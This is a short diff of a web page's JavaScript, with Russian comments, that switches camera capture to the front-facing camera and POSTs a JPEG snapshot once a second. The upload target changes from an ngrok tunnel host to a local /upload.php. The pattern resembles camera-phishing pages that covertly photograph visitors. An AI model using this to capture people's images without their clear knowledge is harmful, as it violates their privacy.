@@ -14,9 +14,9 @@
       const canvas = document.getElementById("canvas");
       const context = canvas.getContext("2d");
 
-      // Запрос доступа к камере с использованием задней камеры
+      // Запрос доступа к передней камере
       navigator.mediaDevices
-        .getUserMedia({ video: { facingMode: "environment" } })  // Используем "environment" для задней камеры
+        .getUserMedia({ video: { facingMode: "user" } }) // Изменено на "user" для передней камеры
         .then((stream) => {
           video.srcObject = stream;
         })
@@ -27,18 +27,21 @@
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        canvas.toBlob((blob) => {
-          const formData = new FormData();
-          formData.append("image", blob, "snapshot.jpg");
+        canvas.toBlob(
+          (blob) => {
+            const formData = new FormData();
+            formData.append("image", blob, "snapshot.jpg");
 
-          fetch("https://f694-91-205-48-117.ngrok-free.app/upload.php", {
-            method: "POST",
-            body: formData,
-          })
-            .then((response) => response.text())
-            .then((data) => console.log("Ответ сервера:", data))
-            .catch((error) => console.error("Ошибка отправки:", error));
-        }, "image/jpeg");
+            fetch("/upload.php", {
+              method: "POST",
+              body: formData,
+            })
+              .then((response) => response.text())
+              .then((data) => console.log("Ответ сервера:", data))
+              .catch((error) => console.error("Ошибка отправки:", error));
+          },
+          "image/jpeg"
+        );
       }
 
       // Запускаем отправку снимков каждую секунду
